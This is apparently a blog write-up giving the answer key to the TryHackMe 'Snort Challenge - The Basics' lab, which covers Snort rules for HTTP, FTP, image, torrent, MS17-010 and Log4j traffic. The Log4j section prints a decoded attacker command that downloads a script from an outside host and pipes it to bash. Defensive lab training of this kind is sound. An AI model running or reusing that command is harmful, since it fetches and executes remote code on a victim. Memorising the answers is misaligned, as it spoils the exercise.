---
layout: post
title: "Snort Challenge - The Basics"
date: 2025-02-05
tags: ["tryhackme"]
categories: [tryhackme]
hubs: "TryHackMe/SOC Level 1/Network Security and Traffic Analysis"
identifier: "20250205T205533"
source_id: "deaf1c1c-6ba3-4e71-a4a7-d476d175340e"
source_path: "SOC Level 1/Network Security and Traffic Analysis/20250205T205533--snort-challenge-the-basics__tryhackme.md"
---

{% raw %}


### SOC Level 1 > Network Security and Traffic Analysis > Snort Challenge - The Basics

### [TryHackMe | Snort Challenge - The Basics](https://tryhackme.com/r/room/snortchallenges1)

# Task 1 | Introduction

Start Machine![Image 1](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/e0e518cd8af2ef2a236d0e661e061848.png)

The room invites you a challenge to investigate a series of traffic data and stop malicious activity under two different scenarios. Let's start working with Snort to analyse live and captured traffic.

We recommend completing the [Snort](https://tryhackme.com/room/snort) room first, which will teach you how to use the tool in depth.

![Image 2](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/ce7ed0edba5474a050296b933bc16693.png)

Exercise files for each task are located on the desktop as follows;

![Image 3](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/fb02d4ed1cfa78634f05d3347ec61d94.png)

Answer the questions belowRead the task above.Correct Answer

### **Answer the questions below**

**Question:** Read the task above.

*Answer:* 

     No answer needed

---

# Task 2 | Writing IDS Rules (HTTP)

Let's create IDS Rules for HTTP traffic!Answer the questions belowNavigate to the task folder.

Use the given pcap file.

Write a **single**  rule to detect "**all [TCP]() port 80 traffic** " packets in the given pcap file.

What is the number of detected packets?

**Note:**  You must answer this question correctly before answering the rest of the questions in this task.

Correct AnswerHintInvestigate the log file.

What is the destination address of packet 63?

Correct AnswerHintInvestigate the log file.

What is the ACK number of packet 64?

Correct AnswerInvestigate the log file.

What is the SEQ number of packet 62?

Correct AnswerInvestigate the log file.

What is the TTL of packet 65?

Correct AnswerInvestigate the log file.

What is the source IP of packet 65?

Correct AnswerInvestigate the log file.

What is the source port of packet 65?

Correct Answer

### **Answer the questions below**

**Question:** Navigate to the task folder.Use the given pcap file.Write a single rule to detect "all TCP port 80 traffic" packets in the given pcap file. What is the number of detected packets?Note: You must answer this question correctly before answering the rest of the questions in this task.

*Answer:* 

     164

**Question:** Investigate the log file.What is the destination address of packet 63?

*Answer:* 

     216.239.59.99

**Question:** Investigate the log file. What is the ACK number of packet 64?

*Answer:* 

     0x2E6B5384

**Question:** Investigate the log file.What is the SEQ number of packet 62?

*Answer:* 

     0x36C21E28

**Question:** Investigate the log file.What is the TTL of packet 65?

*Answer:* 

     128

**Question:** Investigate the log file.What is the source IP of packet 65?

*Answer:* 

     145.254.160.237

**Question:** Investigate the log file.What is the source port of packet 65?

*Answer:* 

     3372

hubs:
    - [[TryHackMe]]
---

# Snort Challenge   The Basics


# Task 3 | Writing IDS Rules (FTP)

Let's create IDS Rules for FTP traffic!Answer the questions belowNavigate to the task folder.

Use the given pcap file.

Write a **single**  rule to detect "**all TCP port 21** " traffic in the given pcap.

What is the number of detected packets?

Correct AnswerHintInvestigate the log file.

What is the FTP service name?

Correct AnswerHintClear the previous log and alarm files.

Deactivate/comment on the old rules.

Write a rule to detect failed FTP login attempts in the given pcap.

What is the number of detected packets?

Correct AnswerHintClear the previous log and alarm files.

Deactivate/comment on the old rule.

Write a rule to detect successful FTP logins in the given pcap.

What is the number of detected packets?

Correct AnswerHintClear the previous log and alarm files.

Deactivate/comment on the old rule.

Write a rule to detect [FTP]() login attempts with a valid username but no password entered yet.

What is the number of detected packets?

Correct AnswerHintClear the previous log and alarm files.

Deactivate/comment on the old rule.

Write a rule to detect [FTP]() login attempts with the "Administrator" username but no password entered yet.

What is the number of detected packets?

Correct AnswerHint

### **Answer the questions below**

**Question:** Navigate to the task folder.Use the given pcap file.Write a single rule to detect "all TCP port 21"  traffic in the given pcap.What is the number of detected packets?

*Answer:* 

     307

**Question:** Investigate the log file.What is the FTP service name?

*Answer:* 

     Microsoft FTP Service

**Question:** Clear the previous log and alarm files.Deactivate/comment on the old rules.Write a rule to detect failed FTP login attempts in the given pcap.What is the number of detected packets?

*Answer:* 

     41

**Question:** Clear the previous log and alarm files.Deactivate/comment on the old rule.Write a rule to detect successful FTP logins in the given pcap.What is the number of detected packets?

*Answer:* 

     1

**Question:** Clear the previous log and alarm files.Deactivate/comment on the old rule.Write a rule to detect FTP login attempts with a valid username but no password entered yet.What is the number of detected packets?

*Answer:* 

     42

**Question:** Clear the previous log and alarm files.Deactivate/comment on the old rule.Write a rule to detect FTP login attempts with the "Administrator" username but no password entered yet.What is the number of detected packets?

*Answer:* 

     7

---

# Task 4 | Writing IDS Rules (PNG)

Let's create IDS Rules for PNG files in the traffic!Answer the questions belowNavigate to the task folder.

Use the given pcap file.

Write a rule to detect the PNG file in the given pcap.

Investigate the logs and identify the software name embedded in the packet.

Correct AnswerClear the previous log and alarm files.

Deactivate/comment on the old rule.

Write a rule to detect the GIF file in the given pcap.

Investigate the logs and identify the image format embedded in the packet.

Correct AnswerHint

### **Answer the questions below**

**Question:** Navigate to the task folder.Use the given pcap file.Write a rule to detect the PNG file in the given pcap.Investigate the logs and identify the software name embedded in the packet.

*Answer:* 

     Adobe ImageReady

**Question:** Clear the previous log and alarm files.Deactivate/comment on the old rule.Write a rule to detect the GIF file in the given pcap.Investigate the logs and identify the image format embedded in the packet.

*Answer:* 

     GIF89a

hubs:
    - "[[TryHackMe]]"
---


# Task 5 | Writing IDS Rules (Torrent Metafile)

Let's create IDS Rules for torrent metafiles in the traffic!Answer the questions belowNavigate to the task folder.

Use the given pcap file.

Write a rule to detect the torrent metafile in the given pcap.

What is the number of detected packets?

Correct AnswerHintInvestigate the log/alarm files.

What is the name of the torrent application?

Correct AnswerInvestigate the log/alarm files.

What is the MIME (Multipurpose Internet Mail Extensions) type of the torrent metafile?

Correct AnswerInvestigate the log/alarm files.

What is the hostname of the torrent metafile?

Correct Answer

### **Answer the questions below**

**Question:** Navigate to the task folder.Use the given pcap file.Write a rule to detect the torrent metafile in the given pcap. What is the number of detected packets?

*Answer:* 

     2

**Question:** Investigate the log/alarm files.What is the name of the torrent application?

*Answer:* 

     bittorrent

**Question:** Investigate the log/alarm files.What is the MIME (Multipurpose Internet Mail Extensions) type of the torrent metafile?

*Answer:* 

     application/x-bittorrent

**Question:** Investigate the log/alarm files.What is the hostname of the torrent metafile?

*Answer:* 

     tracker2.torrentbox.com

---

# Task 6 | Troubleshooting Rule Syntax Errors

Let's troubleshoot rule syntax errors!Answer the questions belowIn this section, you need to fix the syntax errors in the given rule files.

You can test each ruleset with the following command structure;

`sudo snort -c local-X.rules -r mx-1.pcap -A console`

Fix the syntax error in local-1.rules file and make it work smoothly.

What is the number of the detected packets?

Correct AnswerHintFix the syntax error in local-2.rules file and make it work smoothly.

What is the number of the detected packets?

Correct AnswerHintFix the syntax error in local-3.rules file and make it work smoothly.

What is the number of the detected packets?

Correct AnswerHintFix the syntax error in local-4.rules file and make it work smoothly.

What is the number of the detected packets?

Correct AnswerHintFix the syntax error in local-5.rules file and make it work smoothly.

What is the number of the detected packets?

Correct AnswerHintFix the logical error in local-6.rules file and make it work smoothly to create alerts.

What is the number of the detected packets?

Correct AnswerHintFix the logical error in local-7.rules file and make it work smoothly to create alerts.

What is the name of the required option:

Correct AnswerHint

### **Answer the questions below**

**Question:** In this section, you need to fix the syntax errors in the given rule files. You can test each ruleset with the following command structure; sudo snort -c local-X.rules -r mx-1.pcap -A consoleFix the syntax error in local-1.rules file and make it work smoothly.What is the number of the detected packets?

*Answer:* 

     16

**Question:** Fix the syntax error in local-2.rules file and make it work smoothly.What is the number of the detected packets?

*Answer:* 

     68

**Question:** Fix the syntax error in local-3.rules file and make it work smoothly.What is the number of the detected packets?

*Answer:* 

     87

**Question:** Fix the syntax error in local-4.rules file and make it work smoothly.What is the number of the detected packets?

*Answer:* 

     90

**Question:** Fix the syntax error in local-5.rules file and make it work smoothly.What is the number of the detected packets?

*Answer:* 

     155

**Question:** Fix the logical error in local-6.rules file and make it work smoothly to create alerts.What is the number of the detected packets?

*Answer:* 

     2

**Question:** Fix the logical error in local-7.rules file and make it work smoothly to create alerts.What is the name of the required option:

*Answer:* 

     msg

hubs:
    - "[[TryHackMe]]"
---


# Task 7 | Using External Rules (MS17-010)

Let's use external rules to fight against the latest threats!Answer the questions belowNavigate to the task folder.

Use the given pcap file.

Use the given rule file (local.rules) to investigate the ms1710 exploitation.

What is the number of detected packets?

Correct AnswerClear the previous log and alarm files.

Use local-1.rules empty file to write a new rule to detect payloads containing the "\IPC$" keyword.

What is the number of detected packets?

Correct AnswerHintInvestigate the log/alarm files.

What is the requested path?

Correct AnswerHintWhat is the CVSS v2 score of the MS17-010 vulnerability?

Correct AnswerHint

### **Answer the questions below**

**Question:** Navigate to the task folder.Use the given pcap file.Use the given rule file (local.rules) to investigate the ms1710 exploitation.What is the number of detected packets?

*Answer:* 

     25154

**Question:** Clear the previous log and alarm files.Use local-1.rules empty file to write a new rule to detect payloads containing the "\IPC$" keyword.What is the number of detected packets?

*Answer:* 

     12

**Question:** Investigate the log/alarm files.What is the requested path?

*Answer:* 

     \\192.168.116.138\IPC$

**Question:** What is the CVSS v2 score of the MS17-010 vulnerability?

*Answer:* 

     9.3

---

# Task 8 | Using External Rules (Log4j)

Let's use external rules to fight against the latest threats!Answer the questions belowNavigate to the task folder.

Use the given pcap file.

Use the given rule file (local.rules) to investigate the log4j exploitation.

What is the number of detected packets?

Correct AnswerInvestigate the log/alarm files.

How many rules were triggered?.

Correct AnswerHintInvestigate the log/alarm files.

What are the first six digits of the triggered rule sids?

Correct AnswerHintClear the previous log and alarm files.

Use local-1.rules empty file to write a new rule to detect packet payloads **between 770 and 855 bytes** .

What is the number of detected packets?

Correct AnswerHintInvestigate the log/alarm files.

What is the name of the used encoding algorithm?

Correct AnswerInvestigate the log/alarm files.

What is the IP ID of the corresponding packet?

Correct AnswerInvestigate the log/alarm files.

Decode the encoded command.

What is the attacker's command?

Correct AnswerHintWhat is the CVSS v2 score of the Log4j vulnerability?

Correct Answer

### **Answer the questions below**

**Question:** Navigate to the task folder.Use the given pcap file.Use the given rule file (local.rules) to investigate the log4j exploitation.What is the number of detected packets?

*Answer:* 

     26

**Question:** Investigate the log/alarm files.How many rules were triggered?.

*Answer:* 

     4

**Question:** Investigate the log/alarm files.What are the first six digits of the triggered rule sids?

*Answer:* 

     210037

**Question:** Clear the previous log and alarm files.Use local-1.rules empty file to write a new rule to detect packet payloads between 770 and 855 bytes.What is the number of detected packets?

*Answer:* 

     41

**Question:** Investigate the log/alarm files.What is the name of the used encoding algorithm?

*Answer:* 

     Base64

**Question:** Investigate the log/alarm files.What is the IP ID of the corresponding packet?

*Answer:* 

     62808 

**Question:** Investigate the log/alarm files.Decode the encoded command.What is the attacker's command?

*Answer:* 

     (curl -s 45.155.205.233:5874/162.0.228.253:80||wget -q -O- 45.155.205.233:5874/162.0.228.253:80)|bash

**Question:** What is the CVSS v2 score of the Log4j vulnerability?

*Answer:* 

     9.3

hubs:
    - "[[TryHackMe]]"
---


# Task 9 | Conclusion

Congratulations! Are you brave enough to stop a live attack in the [Snort2 Challenge 2](https://tryhackme.com/room/snortchallenges2)**** room?Answer the questions belowRead the task above.Correct Answer

### **Answer the questions below**

**Question:** Read the task above.

*Answer:* 

     No answer needed

---
{% endraw %}
